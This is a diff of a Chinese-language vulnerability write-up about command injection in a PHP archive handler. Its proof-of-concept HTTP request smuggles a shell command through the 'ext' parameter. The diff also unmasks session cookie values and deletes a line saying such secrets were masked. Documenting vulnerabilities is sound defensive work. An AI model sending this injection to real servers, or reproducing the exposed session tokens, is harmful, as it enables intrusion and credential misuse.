@@ -37,7 +37,6 @@ source_status: "unknown"
 - success由glob剩余文件数决定而非命令成功，脚本据此判断有误
 - userprocess链副作用未分离，缺版本及修复
 - 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
-- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断
 
 ### 操作风险与恢复
 
@@ -146,7 +145,7 @@ $commandString = "sudo -u apache zip -r -j " . $archiveMainPath . "filename" . $
 ```http
 GET /lib/ajaxHandlers/ajaxArchiveFiles.php?path=1&ext=;ls%3E../../test.txt HTTP/1.1
 Host: 
-Cookie: cookname=testtest; cookid=a13**************************0f2; PHPSESSID=lr7********************q71
+Cookie: cookname=testtest; cookid=a13be657db5e18e453c66c564467b0f2; PHPSESSID=lr7j5r2beat1eprpklrhiorq71
 Cache-Control: max-age=0
 Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
 Sec-Ch-Ua-Mobile: ?0
